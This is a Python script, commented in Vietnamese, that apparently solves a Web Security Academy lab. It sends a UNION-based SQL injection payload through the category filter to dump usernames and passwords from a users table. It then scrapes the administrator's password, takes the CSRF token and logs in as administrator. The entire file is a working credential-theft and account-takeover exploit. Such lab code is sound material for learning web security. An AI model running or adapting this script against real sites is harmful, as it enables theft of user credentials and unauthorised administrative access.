import requests
from bs4 import BeautifulSoup

print("Gửi URL dưới dạng: https://xxxxx.web-security-academy.net/")
url = input("Nhập URL: ").rstrip("/")

union_url = f"{url}/filter?category=Gifts'+UNION+SELECT+username,+password+FROM+users--"
print(f"Thử payload: {union_url}")

response = requests.get(union_url)

if response.status_code == 200:
    soup = BeautifulSoup(response.text, "html.parser")
    #phân tích HTML từ nội dung phản hồi bằng beautifulsoup (chịu cái tên)
    #"html.parser": chọn parser mặc định của Python để xử lý HTML.
    table_rows = soup.find_all("tr")
    #tr: table row (thường được kẹp giữa ý chỉ 1 cột)

    password_found = None
    for row in table_rows:
        th = row.find("th")
        #th: table head (thường chứa username, ID,...)
        td = row.find("td")
        #td: table data (thường chứa mật khẩu,.... )
        if th and td and th.text.strip() == "administrator":#có tài khoản, mật khẩu và mật khẩu khi xóa khoảng trắng là adminadmin
            password_found = td.text.strip()
            break

    if password_found:
        print(f"Tìm thấy password của administrator: {password_found}")
    else:
        print("Không tìm thấy password")
        exit()
else:
    print("Lỗi")
    exit()

login_url = f"{url}/login"
#vào trang loginlogin
session = requests.Session()
#khởi tạo phiênphiên
response = session.get(login_url)
#chạy phiên đăng nhập 
soup = BeautifulSoup(response.text, "html.parser")
csrf_token = soup.find("input", {"name": "csrf"})["value"]
#lấy value của csrf để gửi kèm khi login 
data = {
    "csrf": csrf_token,
    "username": "administrator",
    "password": password_found
}

response = session.post(login_url, data=data)

if "Welcome" in response.text or response.status_code == 200:
    print("Successful!")
else:
    print("Failed!")